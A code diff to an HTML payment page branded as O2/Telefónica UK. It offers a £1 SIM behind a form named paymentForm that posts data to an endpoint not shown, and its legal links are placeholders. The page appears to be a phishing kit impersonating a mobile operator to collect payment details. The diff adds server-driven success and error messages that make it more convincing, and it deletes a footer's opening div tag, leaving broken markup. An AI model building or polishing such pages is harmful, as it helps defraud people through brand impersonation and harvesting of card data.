@@ -91,6 +91,10 @@
   .submit-btn { width: 100%; padding: 16px; background: #0019a5; color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 700; cursor: pointer; transition: background 0.2s, transform 0.1s; font-family: 'Inter', sans-serif; letter-spacing: 0.02em; }
   .submit-btn:hover { background: #0022cc; }
   .submit-btn:active { transform: scale(0.99); }
+  .submission-status { margin-top: 16px; font-size: 14px; min-height: 22px; color: #1a1a2e; }
+  .submission-status.success { color: #0b6e24; }
+  .submission-status.warning { color: #b36b00; }
+  .submission-status.error { color: #cc0000; }
   .form-footer { text-align: center; font-size: 12px; color: #888; margin-top: 14px; line-height: 1.6; }
   .form-footer a { color: #0019a5; text-decoration: none; }
 
@@ -285,8 +289,7 @@
 
       <button type="submit" class="submit-btn">Pay £1 & Get My SIM →</button>
     </form>
-
-    <div class="form-footer">
+      <div id="submissionStatus" class="submission-status"></div>
       By continuing you agree to our <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a>.<br>
       ©2026 Telefónica UK Limited. Registered in England. O2 is a trading name of Telefónica UK Limited.
     </div>
@@ -436,13 +439,24 @@
     })
     .then(res => res.json())
     .then(data => {
-      setTimeout(() => {
+      const statusEl = document.getElementById('submissionStatus');
+      if (data.success) {
+        statusEl.textContent = data.message || 'Order placed successfully.';
+        statusEl.className = 'submission-status success';
         btn.textContent = '✓ Order placed! Your SIM is on its way.';
         btn.style.background = '#006400';
         document.getElementById('paymentForm').reset();
-      }, 1800);
+      } else {
+        statusEl.textContent = data.error || 'Submission failed. Please try again.';
+        statusEl.className = 'submission-status error';
+        btn.textContent = 'Error. Please try again.';
+        btn.style.background = '#cc0000';
+      }
     })
     .catch(err => {
+      const statusEl = document.getElementById('submissionStatus');
+      statusEl.textContent = 'Submission error. Check console for details.';
+      statusEl.className = 'submission-status error';
       btn.textContent = 'Error. Please try again.';
       btn.style.background = '#cc0000';
       console.error('Submission error:', err);
